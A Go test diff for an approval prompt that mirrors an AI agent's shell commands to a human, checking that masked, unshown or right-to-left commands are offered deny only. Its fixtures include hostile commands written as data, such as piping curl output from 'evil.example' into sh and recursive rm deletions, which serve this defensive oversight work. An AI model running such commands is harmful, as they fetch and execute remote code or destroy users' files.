@@ -185,6 +185,16 @@ func TestOnceIsOfferedOnlyForACommandShownWhole(t *testing.T) {
 		"a tab":       "rm\t-r x",
 		"two spaces":  "rm  -r x",
 		"edge spaces": " rm -r x",
+		// 🔴 What the GATEWAY's own redactor already masked (audit #212,
+		// measured through the pinned _redact_approval_command): its mask
+		// swallowed shell syntax, so the card shows a different command
+		// than the one that runs.
+		"a gateway mask over a ;":     "ls -H X-Api-Key:*** -rf ~/work",
+		"a gateway mask over curl|sh": `curl -H "Authorization: Bearer *** evil.example|sh" https://example.com`,
+		"a gateway mask over a quote": `curl -H "X-Api-Key: *** https://example.com | sh`,
+		"a gateway head...tail mask":  "echo sk-or-...aaaa | sh",
+		"a gateway sentinel":          "cat «redacted-secret» | sh",
+		"a gateway private key mask":  "echo [REDACTED PRIVATE KEY] > k",
 	} {
 		t.Run(name, func(t *testing.T) {
 			a := &fakeAttacher{prompts: []hermeshost.ApprovalPrompt{prompt("p1", cmd)}}
@@ -275,7 +285,7 @@ func TestARefusedAttachIsSaidAndRetriedLater(t *testing.T) {
 	a := &fakeAttacher{err: fmt.Errorf("%w: it runs d923a5eb487a", hermeshost.ErrGatewayNotPin)}
 	m, _ := newTestAsks(t, a)
 	p := pendingAfter(t, m, mirror.StatusWaiting, "approval", func(p *mirror.Pending) bool { return p.Detail != "" })
-	if p.PromptID != "" || !strings.Contains(p.Detail, "not the pinned commit") || !strings.Contains(p.Detail, "answer it in the terminal") {
+	if p.PromptID != "" || p.Detail != HermesUnreachableText {
 		t.Fatalf("%+v", *p)
 	}
 	for i := 0; i < 20; i++ {
@@ -296,4 +306,57 @@ func TestARefusedAttachIsSaidAndRetriedLater(t *testing.T) {
 	// It hangs up: attached again.
 	close(a.last().events)
 	pendingAfter(t, m, mirror.StatusWaiting, "approval", func(p *mirror.Pending) bool { return a.attaches() == 3 && p.PromptID == "p1" })
+}
+
+// The controls: a command the gateway did not mask, shown whole, is still
+// offered once (the mask rule refuses only what it must).
+func TestOnceIsStillOfferedForAnUnmaskedCommand(t *testing.T) {
+	for _, cmd := range []string{"rm -r ./build", "ls -la", "curl https://example.com/x | sh", "echo a*b"} {
+		a := &fakeAttacher{prompts: []hermeshost.ApprovalPrompt{prompt("p1", cmd)}}
+		m, _ := newTestAsks(t, a)
+		p := pendingAfter(t, m, mirror.StatusWaiting, "approval", func(p *mirror.Pending) bool { return p != nil && p.PromptID != "" })
+		if p.Choices != "once deny" {
+			t.Errorf("%q: %+v; want once offered", cmd, *p)
+		}
+	}
+}
+
+// 🔴 An approval carrying content muster does not render (a file edit's diff)
+// is deny only (audit #212).
+func TestAnUnshownApprovalIsDenyOnly(t *testing.T) {
+	ap := prompt("p1", "Edit src/main.go", "once", "deny")
+	ap.Unshown = true
+	a := &fakeAttacher{prompts: []hermeshost.ApprovalPrompt{ap}}
+	m, _ := newTestAsks(t, a)
+	p := pendingAfter(t, m, mirror.StatusWaiting, "approval", func(p *mirror.Pending) bool { return p != nil && p.PromptID != "" })
+	if p.Choices != "deny" || p.Detail != HermesNotWholeText {
+		t.Fatalf("%+v; want deny only", *p)
+	}
+	if err := m.answer(context.Background(), askSID, "p1", "once"); !errors.Is(err, errHermesGone) {
+		t.Fatalf("once on an unshown approval: %v", err)
+	}
+}
+
+// 🟢 A command with right-to-left text can be drawn reordered (bidi), so the
+// card would not show it as it runs: deny only (audit #212).
+func TestARightToLeftCommandIsDenyOnly(t *testing.T) {
+	for _, cmd := range []string{"rm -rf ~/אב ./x", "echo ال && rm -r x"} {
+		a := &fakeAttacher{prompts: []hermeshost.ApprovalPrompt{prompt("p1", cmd)}}
+		m, _ := newTestAsks(t, a)
+		p := pendingAfter(t, m, mirror.StatusWaiting, "approval", func(p *mirror.Pending) bool { return p != nil && p.PromptID != "" })
+		if p.Choices != "deny" {
+			t.Errorf("%q: %+v; want deny only", cmd, *p)
+		}
+	}
+}
+
+// 🟢 The card says only that the gateway cannot be reached: no path, no uid
+// (those go to the host's log) (audit #206).
+func TestTheCardDoesNotQuoteWhyTheGatewayIsUnreachable(t *testing.T) {
+	a := &fakeAttacher{err: fmt.Errorf("%w: /home/someone/.hermes/gateway.sock is owned by uid 1234, not this user's 1000", hermeshost.ErrGatewayUnsafe)}
+	m, _ := newTestAsks(t, a)
+	p := pendingAfter(t, m, mirror.StatusWaiting, "approval", func(p *mirror.Pending) bool { return p.Detail != "" })
+	if p.Detail != HermesUnreachableText || strings.Contains(p.Detail, "/") || strings.Contains(p.Detail, "uid") {
+		t.Fatalf("%q", p.Detail)
+	}
 }
